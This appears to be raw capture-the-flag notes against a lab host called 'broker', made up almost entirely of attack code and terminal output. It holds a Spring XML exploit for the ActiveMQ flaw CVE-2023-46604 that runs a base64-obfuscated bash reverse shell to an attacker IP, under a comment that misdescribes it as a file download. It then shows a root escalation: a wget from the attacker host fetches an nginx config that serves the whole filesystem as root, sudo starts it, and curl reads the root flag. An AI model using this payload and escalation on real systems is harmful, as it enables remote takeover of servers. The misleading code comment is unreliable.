

```
kali@kali ~/H/b/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ (main)> cat poc-linux.xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
   xsi:schemaLocation="
 http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>sh</value>
            <value>-c</value>
            <!-- The command below downloads the file and saves it as test.elf -->
            <value>echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zLzQ0NDQgMD4mMQo=' | base64 -d | bash</value>
        </list>
        </constructor-arg>
    </bean>
</beans>

```





```
kali@kali ~/H/b/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ (main)> cat nginx.conf
user root;
events {}
http {
	server {
    		listen 9991;

    	location / {
        	root /;
    		}
	}
}

```


```
activemq@broker:~/ng$ rm -rf nginx.conf
rm -rf nginx.conf
activemq@broker:~/ng$ wget http://10.10.14.3:8001/nginx.conf
wget http://10.10.14.3:8001/nginx.conf
--2024-03-08 11:38:26--  http://10.10.14.3:8001/nginx.conf
Connecting to 10.10.14.3:8001... connected.
HTTP request sent, awaiting response... 200 OK
Length: 107 [application/octet-stream]
Saving to: ‘nginx.conf’

     0K                                                       100% 14.6M=0s

2024-03-08 11:38:29 (14.6 MB/s) - ‘nginx.conf’ saved [107/107]

activemq@broker:~/ng$ sudo /usr/sbin/nginx -c /home/activemq/ng/nginx.conf
sudo /usr/sbin/nginx -c /home/activemq/ng/nginx.conf
activemq@broker:~/ng$ curl 127.0.0.1:9999/root/root.txt
curl 127.0.0.1:9999/root/root.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   162  100   162    0     0   130k      0 --:--:-- --:--:-- --:--:--  158k
<html>
<head><title>403 Forbidden</title></head>
<body>
<center><h1>403 Forbidden</h1></center>
<hr><center>nginx/1.18.0 (Ubuntu)</center>
</body>
</html>
activemq@broker:~/ng$ sudo -l
sudo -l
Matching Defaults entries for activemq on broker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
activemq@broker:~/ng$ sudo /usr/sbin/nginx -s reload
sudo /usr/sbin/nginx -s reload
activemq@broker:~/ng$ curl localhost:9991/root/root.txt
curl localhost:9991/root/root.txt
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100    33  100    33    0     0  25037      0 --:--:-- --:--:-- --:--:-- 33000
8be49b01997600c94f43d15c7f331301

```


https://stackoverflow.com/questions/59769122/invalid-number-of-arguments-in-location-nginx-conf

https://stackoverflow.com/questions/54481423/nginx-startup-prompt-emerg-no-events-section-in-configuration

https://stackoverflow.com/questions/20182329/nginx-is-throwing-an-403-forbidden-on-static-files